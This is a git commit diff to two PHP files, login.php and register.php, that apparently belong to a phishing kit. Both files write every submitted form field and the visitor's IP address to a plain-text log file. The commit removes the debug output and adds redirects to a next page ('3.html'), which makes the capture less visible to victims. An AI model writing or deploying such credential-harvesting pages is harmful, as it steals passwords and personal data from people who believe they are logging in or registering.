cde3a3302e6cb8db55f79e72308e80df15ce2672
skygod1994323 <skygod1994323@gmail.com>
2021-05-07 04:58:02 -0700

    a

--- login.php
+++ login.php
@@ -1,12 +1,11 @@
 <?php 
-    var_dump('you logged in');
     $handle = fopen('log.txt', 'a');
 
-    fwrite($handle, '--------[Login]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
+    fwrite($handle, '--------[Page2]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
     foreach ($_POST as $variable => $value) {
         fwrite($handle, $variable.': '.$value."\r\n");
     }; 
     fclose($handle); 
 
-    var_dump('pleack check log.txt');
+    header('location: 3.html');
 ?>
--- register.php
+++ register.php
@@ -1,11 +1,10 @@
 <?php 
-    var_dump('you registered');
     $handle = fopen('log.txt', 'a');
 
-    fwrite($handle, '--------[Register]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
+    fwrite($handle, '--------[Page3]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
     foreach ($_POST as $variable => $value) {
         fwrite($handle, $variable.': '.$value."\r\n");
     }; 
     fclose($handle); 
-    var_dump('pleack check log.txt');
+    header('location: 3.html');
 ?>
